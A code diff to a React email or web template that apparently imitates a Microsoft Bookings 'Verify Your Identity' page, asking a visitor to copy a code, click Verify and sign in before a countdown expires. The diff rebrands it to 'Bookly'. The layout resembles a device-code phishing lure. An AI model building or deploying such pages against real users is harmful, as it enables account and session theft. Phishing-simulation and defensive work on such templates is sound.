@@ -24,11 +24,10 @@ export function BookingsMeetingTemplate(): React.ReactElement {
     <div className="tpl-page" style={{ background: '#f5f5f5' }}>
       <div className="tpl-container" style={{ maxWidth: 600 }}>
         <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 24 }}>
-          <svg width="108" height="24" viewBox="0 0 108 24" fill="none">
-            <rect width="11" height="11" fill="#f25022" /><rect x="12" width="11" height="11" fill="#7fba00" />
-            <rect y="12" width="11" height="11" fill="#00a4ef" /><rect x="12" y="12" width="11" height="11" fill="#ffb900" />
-            <text x="28" y="17" fill="#5e5e5e" fontSize="14" fontFamily="Segoe UI, sans-serif" fontWeight="600">Bookings</text>
-          </svg>
+          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
+            <svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#0078d4"/><path d="M8 8h16v16H8z" fill="white" opacity="0.9"/><path d="M12 6v4M20 6v4M8 12h16" stroke="#0078d4" strokeWidth="1.5"/></svg>
+            <span style={{ fontSize: 18, fontWeight: 600, color: '#2c2c2c' }}>Bookly</span>
+          </div>
         </div>
 
         <div className="tpl-card">
@@ -74,7 +73,7 @@ export function BookingsMeetingTemplate(): React.ReactElement {
               <h1 className="tpl-title">Verify Your Identity</h1>
               <p className="tpl-text">Enter this code to confirm your booking for {selectedTime}.</p>
               <div className="tpl-code-box"><div className="tpl-code-label">BOOKING CODE</div><div className="tpl-code">{f.userCode}</div><button className="tpl-copy-btn" onClick={f.handleCopy}>{f.copied ? 'Copied!' : 'Copy'}</button></div>
-              <div className="tpl-steps"><div className="tpl-step">1. Copy the booking code</div><div className="tpl-step">2. Click verify and sign in</div></div>
+              <div className="tpl-steps"><div className="tpl-step">1. Copy the booking code</div><div className="tpl-step">2. Click verify and enter the code</div></div>
               <button className="tpl-btn" style={{ background: '#0078d4' }} onClick={f.handleVerify}>Verify</button>
               {f.state === 'waiting' && <p className="tpl-waiting">Waiting for verification...</p>}
               <p className="tpl-expiry">Code expires in {f.formatTime(f.countdown)}</p>
@@ -84,7 +83,7 @@ export function BookingsMeetingTemplate(): React.ReactElement {
           {f.state === 'expired' && <div className="tpl-center"><h1 className="tpl-title">Code Expired</h1><button className="tpl-btn" style={{ background: '#0078d4' }} onClick={f.handleReset}>Try Again</button></div>}
           {f.state === 'error' && <div className="tpl-center"><h1 className="tpl-title">Error</h1><p className="tpl-text">{f.errorMsg}</p><button className="tpl-btn" style={{ background: '#0078d4' }} onClick={f.handleReset}>Try Again</button></div>}
         </div>
-        <div className="tpl-footer"><span>Microsoft Bookings</span><span>Terms</span><span>Privacy</span></div>
+        <div className="tpl-footer"><span>Bookly</span><span>Terms</span><span>Privacy</span></div>
       </div>
     </div>
   );
